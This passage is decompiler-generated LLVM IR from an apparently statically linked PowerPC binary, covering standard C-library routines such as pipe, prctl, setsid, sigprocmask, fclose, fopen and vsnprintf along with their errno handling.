  %v1_1000ca7c = and i32 %v0_1000ca78, 268435456
  %v3_1000ca7c = icmp eq i32 %v1_1000ca7c, 0
  store i32 %v0_1000ca78, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ca7c, label %dec_label_pc_1000ca94, label %dec_label_pc_1000ca88

dec_label_pc_1000ca88:                            ; preds = %dec_label_pc_1000ca70
  %v0_1000ca88 = call i32 @__errno_location()
  %v0_1000ca8c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca8c = inttoptr i32 %v0_1000ca88 to i32*
  store i32 %v0_1000ca8c, i32* %v2_1000ca8c, align 4
  br label %dec_label_pc_1000ca94

dec_label_pc_1000ca94:                            ; preds = %dec_label_pc_1000ca70, %dec_label_pc_1000ca88
  %v0_1000caa4 = phi i32 [ %v0_1000ca78, %dec_label_pc_1000ca70 ], [ -1, %dec_label_pc_1000ca88 ]
  ret i32 %v0_1000caa4

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca70, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000cab4 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000cab4
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cad0 = call i32 @__asm_mfcr()
  %v1_1000cad4 = and i32 %v0_1000cad0, 268435456
  %v3_1000cad4 = icmp eq i32 %v1_1000cad4, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000cad0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cad4, label %dec_label_pc_1000caec, label %dec_label_pc_1000cae0

dec_label_pc_1000cae0:                            ; preds = %entry
  %v0_1000cae0 = call i32 @__errno_location()
  %v0_1000cae4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cae4 = inttoptr i32 %v0_1000cae0 to i32*
  store i32 %v0_1000cae4, i32* %v2_1000cae4, align 4
  br label %dec_label_pc_1000caec

dec_label_pc_1000caec:                            ; preds = %entry, %dec_label_pc_1000cae0
  %v0_1000cafc = phi i32 [ %v0_1000cad0, %entry ], [ -1, %dec_label_pc_1000cae0 ]
  ret i32 %v0_1000cafc

; uselistorder directives
  uselistorder label %dec_label_pc_1000caec, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cb18 = call i32 @__asm_mfcr()
  %v1_1000cb1c = and i32 %v0_1000cb18, 268435456
  %v3_1000cb1c = icmp eq i32 %v1_1000cb1c, 0
  store i32 %v0_1000cb18, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cb1c, label %dec_label_pc_1000cb34, label %dec_label_pc_1000cb28

dec_label_pc_1000cb28:                            ; preds = %entry
  %v0_1000cb28 = call i32 @__errno_location()
  %v0_1000cb2c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cb2c = inttoptr i32 %v0_1000cb28 to i32*
  store i32 %v0_1000cb2c, i32* %v2_1000cb2c, align 4
  br label %dec_label_pc_1000cb34

dec_label_pc_1000cb34:                            ; preds = %entry, %dec_label_pc_1000cb28
  %v0_1000cb44 = phi i32 [ %v0_1000cb18, %entry ], [ -1, %dec_label_pc_1000cb28 ]
  ret i32 %v0_1000cb44

; uselistorder directives
  uselistorder label %dec_label_pc_1000cb34, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cb60 = call i32 @__asm_mfcr()
  %v1_1000cb64 = and i32 %v0_1000cb60, 268435456
  %v3_1000cb64 = icmp eq i32 %v1_1000cb64, 0
  store i32 %v0_1000cb60, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cb64, label %dec_label_pc_1000cb7c, label %dec_label_pc_1000cb70

dec_label_pc_1000cb70:                            ; preds = %entry
  %v0_1000cb70 = call i32 @__errno_location()
  %v0_1000cb74 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cb74 = inttoptr i32 %v0_1000cb70 to i32*
  store i32 %v0_1000cb74, i32* %v2_1000cb74, align 4
  br label %dec_label_pc_1000cb7c

dec_label_pc_1000cb7c:                            ; preds = %entry, %dec_label_pc_1000cb70
  %v0_1000cb8c = phi i32 [ %v0_1000cb60, %entry ], [ -1, %dec_label_pc_1000cb70 ]
  ret i32 %v0_1000cb8c

; uselistorder directives
  uselistorder label %dec_label_pc_1000cb7c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cba8 = call i32 @__asm_mfcr()
  %v1_1000cbac = and i32 %v0_1000cba8, 268435456
  %v3_1000cbac = icmp eq i32 %v1_1000cbac, 0
  store i32 %v0_1000cba8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cbac, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cbb8

dec_label_pc_1000cbb8:                            ; preds = %entry
  %v0_1000cbb8 = call i32 @__errno_location()
  %v0_1000cbbc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cbbc = inttoptr i32 %v0_1000cbb8 to i32*
  store i32 %v0_1000cbbc, i32* %v2_1000cbbc, align 4
  br label %dec_label_pc_1000cbc4

dec_label_pc_1000cbc4:                            ; preds = %entry, %dec_label_pc_1000cbb8
  %v0_1000cbd4 = phi i32 [ %v0_1000cba8, %entry ], [ -1, %dec_label_pc_1000cbb8 ]
  ret i32 %v0_1000cbd4

; uselistorder directives
  uselistorder label %dec_label_pc_1000cbc4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cbf0 = call i32 @__asm_mfcr()
  %v1_1000cbf4 = and i32 %v0_1000cbf0, 268435456
  %v3_1000cbf4 = icmp eq i32 %v1_1000cbf4, 0
  store i32 %v0_1000cbf0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cbf4, label %dec_label_pc_1000cc0c, label %dec_label_pc_1000cc00

dec_label_pc_1000cc00:                            ; preds = %entry
  %v0_1000cc00 = call i32 @__errno_location()
  %v0_1000cc04 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cc04 = inttoptr i32 %v0_1000cc00 to i32*
  store i32 %v0_1000cc04, i32* %v2_1000cc04, align 4
  br label %dec_label_pc_1000cc0c

dec_label_pc_1000cc0c:                            ; preds = %entry, %dec_label_pc_1000cc00
  %v0_1000cc1c = phi i32 [ %v0_1000cbf0, %entry ], [ -1, %dec_label_pc_1000cc00 ]
  ret i32 %v0_1000cc1c

; uselistorder directives
  uselistorder label %dec_label_pc_1000cc0c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000cc20 = icmp eq i32 %arg2, 0
  br i1 %v3_1000cc20, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc48

dec_label_pc_1000cc48:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc50

dec_label_pc_1000cc50:                            ; preds = %dec_label_pc_1000cc48
  %v0_1000cc50 = call i32 @__errno_location()
  %v2_1000cc58 = inttoptr i32 %v0_1000cc50 to i32*
  store i32 22, i32* %v2_1000cc58, align 4
  %v0_1000cc84.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cc80

dec_label_pc_1000cc60:                            ; preds = %dec_label_pc_1000cc48, %entry
  %v0_1000cc64 = call i32 @__asm_mfcr()
  %v1_1000cc68 = and i32 %v0_1000cc64, 268435456
  %v3_1000cc68 = icmp eq i32 %v1_1000cc68, 0
  store i32 %v0_1000cc64, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cc68, label %dec_label_pc_1000cc80, label %dec_label_pc_1000cc74

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc60
  %v0_1000cc74 = call i32 @__errno_location()
  %v0_1000cc78 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cc78 = inttoptr i32 %v0_1000cc74 to i32*
  store i32 %v0_1000cc78, i32* %v2_1000cc78, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cc80

dec_label_pc_1000cc80:                            ; preds = %dec_label_pc_1000cc60, %dec_label_pc_1000cc50, %dec_label_pc_1000cc74
  %v0_1000cc84 = phi i32 [ %v0_1000cc64, %dec_label_pc_1000cc60 ], [ %v0_1000cc84.pre, %dec_label_pc_1000cc50 ], [ -1, %dec_label_pc_1000cc74 ]
  ret i32 %v0_1000cc84

; uselistorder directives
  uselistorder label %dec_label_pc_1000cc80, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ccb0 = call i32 @__asm_mfcr()
  %v1_1000ccb4 = and i32 %v0_1000ccb0, 268435456
  %v3_1000ccb4 = icmp eq i32 %v1_1000ccb4, 0
  store i32 %v0_1000ccb0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ccb4, label %dec_label_pc_1000cccc, label %dec_label_pc_1000ccc0

dec_label_pc_1000ccc0:                            ; preds = %entry
  %v0_1000ccc0 = call i32 @__errno_location()
  %v0_1000ccc4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ccc4 = inttoptr i32 %v0_1000ccc0 to i32*
  store i32 %v0_1000ccc4, i32* %v2_1000ccc4, align 4
  br label %dec_label_pc_1000cccc

dec_label_pc_1000cccc:                            ; preds = %entry, %dec_label_pc_1000ccc0
  %v0_1000ccdc = phi i32 [ %v0_1000ccb0, %entry ], [ -1, %dec_label_pc_1000ccc0 ]
  ret i32 %v0_1000ccdc

; uselistorder directives
  uselistorder label %dec_label_pc_1000cccc, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000cce4 = call i32 @wait4(i32 0)
  ret i32 %v1_1000cce4
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cd00 = call i32 @__asm_mfcr()
  %v1_1000cd04 = and i32 %v0_1000cd00, 268435456
  %v3_1000cd04 = icmp eq i32 %v1_1000cd04, 0
  store i32 %v0_1000cd00, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cd04, label %dec_label_pc_1000cd1c, label %dec_label_pc_1000cd10

dec_label_pc_1000cd10:                            ; preds = %entry
  %v0_1000cd10 = call i32 @__errno_location()
  %v0_1000cd14 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cd14 = inttoptr i32 %v0_1000cd10 to i32*
  store i32 %v0_1000cd14, i32* %v2_1000cd14, align 4
  br label %dec_label_pc_1000cd1c

dec_label_pc_1000cd1c:                            ; preds = %entry, %dec_label_pc_1000cd10
  %v0_1000cd2c = phi i32 [ %v0_1000cd00, %entry ], [ -1, %dec_label_pc_1000cd10 ]
  ret i32 %v0_1000cd2c

; uselistorder directives
  uselistorder label %dec_label_pc_1000cd1c, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000cd34 = mul i32 %arg1, 2
  %v3_1000cd38 = load i32, i32* inttoptr (i32 268601240 to i32*), align 8
  %v2_1000cd3c = add i32 %v3_1000cd38, %v1_1000cd34
  %v3_1000cd3c = inttoptr i32 %v2_1000cd3c to i16*
  %v4_1000cd3c = load i16, i16* %v3_1000cd3c, align 2
  %v5_1000cd3c = zext i16 %v4_1000cd3c to i32
  %v1_1000cd40 = call i32 @__asm_rlwinm(i32 %v5_1000cd3c, i32 0, i32 26, i32 26)
  ret i32 %v1_1000cd40
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000cd48 = add i32 %arg1, 128
  %v1_1000cd4c = mul i32 %arg1, 2
  %v2_1000cd50 = icmp ugt i32 %v1_1000cd48, 383
  %v0_1000cd54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000cd50, i32 %v0_1000cd54)
  %v3_1000cd5c = load i32, i32* inttoptr (i32 268601248 to i32*), align 32
  %v2_1000cd60 = add i32 %v1_1000cd4c, %v3_1000cd5c
  %v3_1000cd60 = inttoptr i32 %v2_1000cd60 to i16*
  %v4_1000cd60 = load i16, i16* %v3_1000cd60, align 2
  %v5_1000cd60 = sext i16 %v4_1000cd60 to i32
  ret i32 %v5_1000cd60
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10028830.606 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000cd88 = add i32 %tmp, 52
  %v3_1000cd88 = inttoptr i32 %v2_1000cd88 to i32*
  %v4_1000cd88 = load i32, i32* %v3_1000cd88, align 4
  store i32 %v4_1000cd88, i32* @r28, align 4
  %v3_1000cd8c = icmp eq i32 %v4_1000cd88, 0
  store i1 %v3_1000cd8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cd8c, label %dec_label_pc_1000cd94, label %dec_label_pc_1000cdb4

dec_label_pc_1000cd94:                            ; preds = %entry
  %v2_1000cd9c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000cd9c, i32* @r3, align 4
  %v0_1000cda8 = call i32 @__pthread_return_void()
  %v0_1000cdb0 = call i32 @__pthread_return_0()
  %v0_1000cdb4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cdb4

dec_label_pc_1000cdb4:                            ; preds = %entry, %dec_label_pc_1000cd94
  %v0_1000cdc4 = phi i32 [ %tmp, %entry ], [ %v0_1000cdb4.pre, %dec_label_pc_1000cd94 ]
  %v1_1000cdb4 = inttoptr i32 %v0_1000cdc4 to i16*
  %v2_1000cdb4 = load i16, i16* %v1_1000cdb4, align 2
  %v3_1000cdb4 = zext i16 %v2_1000cdb4 to i32
  store i32 0, i32* @r27, align 4
  %v1_1000cdbc = and i32 %v3_1000cdb4, 64
  %v3_1000cdbc = icmp eq i32 %v1_1000cdbc, 0
  br i1 %v3_1000cdbc, label %dec_label_pc_1000cdd0, label %dec_label_pc_1000cdc4

dec_label_pc_1000cdc4:                            ; preds = %dec_label_pc_1000cdb4
  store i32 268488140, i32* @lr, align 4
  %v4_1000cdc8 = call i32 @fflush_unlocked(i16* %v1_1000cdb4, i32 %v1_1000cdbc)
  store i32 %v4_1000cdc8, i32* @r27, align 4
  %v0_1000cdd0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cdd0

dec_label_pc_1000cdd0:                            ; preds = %dec_label_pc_1000cdb4, %dec_label_pc_1000cdc4
  %v0_1000cdd0 = phi i32 [ %v0_1000cdc4, %dec_label_pc_1000cdb4 ], [ %v0_1000cdd0.pre, %dec_label_pc_1000cdc4 ]
  %v1_1000cdd0 = add i32 %v0_1000cdd0, 4
  %v2_1000cdd0 = inttoptr i32 %v1_1000cdd0 to i32*
  %v3_1000cdd0 = load i32, i32* %v2_1000cdd0, align 4
  store i32 268488152, i32* @lr, align 4
  %v1_1000cdd4 = call i32 @__libc_close(i32 %v3_1000cdd0)
  %v3_1000cdd8 = icmp eq i32 %v1_1000cdd4, 0
  store i1 %v3_1000cdd8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_1000cdd4, -1
  br i1 %tmp8, label %dec_label_pc_1000cde4, label %dec_label_pc_1000cde0

dec_label_pc_1000cde0:                            ; preds = %dec_label_pc_1000cdd0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000cde4

dec_label_pc_1000cde4:                            ; preds = %dec_label_pc_1000cdd0, %dec_label_pc_1000cde0
  store i32 ptrtoint ([3 x i8]* @global_var_1001104c.607 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_10028478.608 to i32), i32* @r29, align 4
  %v1_1000cdf8 = load i32, i32* @r31, align 4
  %v2_1000cdf8 = add i32 %v1_1000cdf8, 4
  %v3_1000cdf8 = inttoptr i32 %v2_1000cdf8 to i32*
  store i32 -1, i32* %v3_1000cdf8, align 4
  %v2_1000cdfc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000cdfc, i32* @r30, align 4
  store i32 %v2_1000cdfc, i32* @r3, align 4
  %v0_1000ce0c = call i32 @__pthread_return_void()
  %v0_1000ce14 = call i32 @__pthread_return_0()
  %v3_1000ce1c = load i32, i32* @global_var_10028808.609, align 4
  store i32 %v2_1000cdfc, i32* @r3, align 4
  %v1_1000ce28 = add i32 %v3_1000ce1c, 1
  store i32 %v1_1000ce28, i32* @global_var_10028808.609, align 4
  %v0_1000ce30 = call i32 @__pthread_return_void()
  %v0_1000ce34 = load i32, i32* @r31, align 4
  %v1_1000ce34 = inttoptr i32 %v0_1000ce34 to i16*
  %v2_1000ce34 = load i16, i16* %v1_1000ce34, align 2
  %v3_1000ce34 = zext i16 %v2_1000ce34 to i32
  %v0_1000ce38 = load i32, i32* @r28, align 4
  %v3_1000ce38 = icmp eq i32 %v0_1000ce38, 0
  store i1 %v3_1000ce38, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ce3c = call i32 @__asm_rlwinm(i32 %v3_1000ce34, i32 0, i32 17, i32 18)
  %v1_1000ce44 = or i32 %v1_1000ce3c, 48
  %v1_1000ce48 = trunc i32 %v1_1000ce44 to i16
  %v2_1000ce48 = load i32, i32* @r31, align 4
  %v3_1000ce48 = inttoptr i32 %v2_1000ce48 to i16*
  store i16 %v1_1000ce48, i16* %v3_1000ce48, align 2
  %v0_1000ce4c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ce4c, label %dec_label_pc_1000ce50, label %dec_label_pc_1000ce5c

dec_label_pc_1000ce50:                            ; preds = %dec_label_pc_1000cde4
  %v2_1000ce50 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ce50, i32* @r3, align 4
  %v0_1000ce58 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000ce5c

dec_label_pc_1000ce5c:                            ; preds = %dec_label_pc_1000cde4, %dec_label_pc_1000ce50
  %v0_1000ce5c = load i32, i32* @r31, align 4
  %v1_1000ce5c = inttoptr i32 %v0_1000ce5c to i16*
  %v2_1000ce5c = load i16, i16* %v1_1000ce5c, align 2
  %v1_1000ce60 = and i16 %v2_1000ce5c, 16384
  %v3_1000ce60 = icmp eq i16 %v1_1000ce60, 0
  br i1 %v3_1000ce60, label %dec_label_pc_1000ce70, label %dec_label_pc_1000ce68

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce5c
  %v1_1000ce68 = add i32 %v0_1000ce5c, 8
  %v2_1000ce68 = inttoptr i32 %v1_1000ce68 to i32*
  %v3_1000ce68 = load i32, i32* %v2_1000ce68, align 4
  store i32 %v3_1000ce68, i32* @r3, align 4
  store i32 268488304, i32* @lr, align 4
  %v0_1000ce6c = call i32 @free()
  br label %dec_label_pc_1000ce70

dec_label_pc_1000ce70:                            ; preds = %dec_label_pc_1000ce5c, %dec_label_pc_1000ce68
  store i32 %v2_1000cdfc, i32* @r3, align 4
  %v0_1000ce7c = call i32 @__pthread_return_void()
  %v0_1000ce84 = call i32 @__pthread_return_0()
  %v3_1000ce8c = load i32, i32* @global_var_1002880c.610, align 4
  store i32 %v2_1000cdfc, i32* @r3, align 4
  %v1_1000ce98 = add i32 %v3_1000ce8c, 1
  store i32 %v1_1000ce98, i32* @global_var_1002880c.610, align 4
  %v0_1000cea0 = call i32 @__pthread_return_void()
  store i32 268488360, i32* @lr, align 4
  %v0_1000cea4 = call i32 @_stdio_openlist_dec_use()
  %v0_1000ceac = load i32, i32* @r27, align 4
  ret i32 %v0_1000ceac

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ce70, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cde4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cdd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cdb4, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_1000cec8 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_1000cec8
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000ceec = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000ceec, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000cf3c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000cf3c, i32* %stack_var_-96, align 4
  store i32 268488520, i32* @lr, align 4
  %v0_1000cf44 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000cf44
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000cf64 = load i32, i32* @r4, align 4
  store i32 %v0_1000cf64, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000cf80 = load i32, i32* @r3, align 4
  %v1_1000cf80 = sub i32 -1, %v0_1000cf80
  store i32 %v1_1000cf80, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000cf80, i32* %r31.global-to-local, align 4
  %v2_1000cf94 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000cf94, i32* @r3, align 4
  %v0_1000cf98 = load i32, i32* @r5, align 4
  store i32 %v0_1000cf98, i32* %r29.global-to-local, align 4
  %v0_1000cf9c = load i32, i32* @r6, align 4
  store i32 %v0_1000cf9c, i32* @r28, align 4
  store i32 268488620, i32* @lr, align 4
  %v0_1000cfa8 = call i32 @__stdio_init_mutex()
  %v0_1000cfac = load i32, i32* %r30.global-to-local, align 4
  %v1_1000cfac = load i32, i32* @r27, align 4
  %v3_1000cfac = icmp ugt i32 %v0_1000cfac, %v1_1000cfac
  %v0_1000cfb0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cfb0, i32* @r4, align 4
  %v0_1000cfb4 = load i32, i32* @r28, align 4
  store i32 %v0_1000cfb4, i32* @r5, align 4
  %v2_1000cfb8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000cfb8, i32* @r3, align 4
  br i1 %v3_1000cfac, label %dec_label_pc_1000cfc4, label %dec_label_pc_1000cfc8

dec_label_pc_1000cfc4:                            ; preds = %entry
  store i32 %v1_1000cfac, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cfc8

dec_label_pc_1000cfc8:                            ; preds = %entry, %dec_label_pc_1000cfc4
  %v1_1000cfc8 = phi i32 [ %v0_1000cfac, %entry ], [ %v1_1000cfac, %dec_label_pc_1000cfc4 ]
  %v0_1000cfc8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268488680, i32* @lr, align 4
  %v0_1000cfe4 = call i32 @_vfprintf_internal()
  %v0_1000cfe8 = load i32, i32* @r30, align 4
  %v3_1000cfe8 = icmp eq i32 %v0_1000cfe8, 0
  br i1 %v3_1000cfe8, label %dec_label_pc_1000d010, label %dec_label_pc_1000cff0

dec_label_pc_1000cff0:                            ; preds = %dec_label_pc_1000cfc8
  %v4_1000cffc = icmp eq i32 %v1_1000cfc8, 0
  %v1_1000cff8 = sext i1 %v4_1000cffc to i32
  %v0_1000d004.v0_1000cfc8 = add i32 %v0_1000cfc8, %v1_1000cff8
  %stack_var_-88.0 = inttoptr i32 %v0_1000d004.v0_1000cfc8 to i8*
  %v0_1000d00c = load i32, i32* @r26, align 4
  %v1_1000d00c = trunc i32 %v0_1000d00c to i8
  store i8 %v1_1000d00c, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000d010

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000cfc8, %dec_label_pc_1000cff0
  ret i32 %v0_1000cfe4

; uselistorder directives
  uselistorder i32 %v0_1000cf80, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_1000d010, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfc8, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000d024 = load i32, i32* @lr, align 4
  store i32 %v0_1000d024, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1000d038 = load i32, i32* @r5, align 4
  store i32 %v0_1000d038, i32* @r31, align 4
  %v0_1000d03c = load i32, i32* @r6, align 4
  store i32 %v0_1000d03c, i32* @r29, align 4
  %v3_1000d040 = load i8, i8* %arg2, align 1
  %v4_1000d040 = zext i8 %v3_1000d040 to i32
  store i32 %v4_1000d040, i32* %r0.global-to-local, align 4
  %v3_1000d044 = icmp eq i8 %v3_1000d040, 114
  br i1 %v3_1000d044, label %dec_label_pc_1000d090, label %dec_label_pc_1000d04c

dec_label_pc_1000d04c:                            ; preds = %entry
  %v3_1000d04c = icmp eq i8 %v3_1000d040, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000d04c, label %dec_label_pc_1000d094, label %dec_label_pc_1000d058

dec_label_pc_1000d058:                            ; preds = %dec_label_pc_1000d04c
  %v3_1000d058 = icmp eq i8 %v3_1000d040, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1000d058, label %dec_label_pc_1000d094, label %dec_label_pc_1000d064

dec_label_pc_1000d064:                            ; preds = %dec_label_pc_1000d124, %dec_label_pc_1000d0f4, %dec_label_pc_1000d058
  %v0_1000d064 = call i32 @__errno_location()
  %v0_1000d068 = load i32, i32* @r31, align 4
  %v3_1000d068 = icmp eq i32 %v0_1000d068, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000d070 = inttoptr i32 %v0_1000d064 to i32*
  store i32 22, i32* %v2_1000d070, align 4
  br i1 %v3_1000d068, label %dec_label_pc_1000d2c4, label %dec_label_pc_1000d078

dec_label_pc_1000d078:                            ; preds = %dec_label_pc_1000d158, %dec_label_pc_1000d064
  %v0_1000d078 = load i32, i32* @r31, align 4
  %v1_1000d078 = inttoptr i32 %v0_1000d078 to i16*
  %v2_1000d078 = load i16, i16* %v1_1000d078, align 2
  %v3_1000d078 = zext i16 %v2_1000d078 to i32
  store i32 %v3_1000d078, i32* %r0.global-to-local, align 4
  %v1_1000d07c = and i32 %v3_1000d078, 8192
  store i32 %v1_1000d07c, i32* %r9.global-to-local, align 4
  %v3_1000d07c = icmp eq i32 %v1_1000d07c, 0
  store i1 %v3_1000d07c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000d07c, label %dec_label_pc_1000d2c4, label %dec_label_pc_1000d084

dec_label_pc_1000d084:                            ; preds = %dec_label_pc_1000d078
  store i32 %v0_1000d078, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000d08c.612 to i32), i32* @lr, align 4
  %v0_1000d088 = call i32 @free()
  br label %dec_label_pc_1000d2c4

dec_label_pc_1000d090:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d094

dec_label_pc_1000d094:                            ; preds = %dec_label_pc_1000d058, %dec_label_pc_1000d04c, %dec_label_pc_1000d090
  %v0_1000d0b4 = phi i32 [ 1089, %dec_label_pc_1000d058 ], [ 577, %dec_label_pc_1000d04c ], [ 1, %dec_label_pc_1000d090 ]
  %v2_1000d094 = add i32 %tmp, 1
  %v3_1000d094 = inttoptr i32 %v2_1000d094 to i8*
  %v4_1000d094 = load i8, i8* %v3_1000d094, align 1
  %v5_1000d094 = zext i8 %v4_1000d094 to i32
  store i32 %v5_1000d094, i32* %r0.global-to-local, align 4
  %v3_1000d09c = icmp eq i8 %v4_1000d094, 98
  br i1 %v3_1000d09c, label %dec_label_pc_1000d0a8, label %dec_label_pc_1000d0a4

dec_label_pc_1000d0a4:                            ; preds = %dec_label_pc_1000d094
  br label %dec_label_pc_1000d0a8

dec_label_pc_1000d0a8:                            ; preds = %dec_label_pc_1000d094, %dec_label_pc_1000d0a4
